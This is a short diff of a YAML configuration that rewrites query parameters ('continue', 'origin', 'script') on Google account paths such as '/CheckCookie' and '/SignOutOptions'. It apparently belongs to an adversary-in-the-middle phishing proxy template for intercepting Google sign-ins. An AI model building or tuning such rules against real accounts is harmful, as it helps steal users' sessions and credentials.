@@ -110,33 +110,18 @@ force_get:
       - {key: 'origin', value: 'https://myaccount.google.com'}
     type: 'get'
 
-  force_get:
-  - path: '/CheckCookie'
-    search:
-      - {key: 'continue', search: '.*'}
-    force:
-      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
-    type: 'get'
-
-  - path: '/SignOutOptions'
-    search:
-      - {key: 'continue', search: '.*'}
-    force:
-      - {key: 'continue', value: 'https://myaccount.google.com'}
-    type: 'get'
-
-  - path: '/RotateCookiesPage'
+  - path: '/profile-picture'
     search:
       - {key: 'origin', search: '.*'}
     force:
       - {key: 'origin', value: 'https://myaccount.google.com'}
     type: 'get'
 
-  - path: '/v3/signin/_/AccountsSignInUi/jserror'
+  - path: '/u/0/widget/account'
     search:
-      - {key: 'script', search: '.*'}
+      - {key: 'origin', search: '.*'}
     force:
-      - {key: 'script', value: 'https://accounts.google.com/v3/signin/identifier'}
+      - {key: 'origin', value: 'https://myaccount.google.com'}
     type: 'get'
 
   - path: '/v3/signin/_/AccountsSignInUi/jserror'
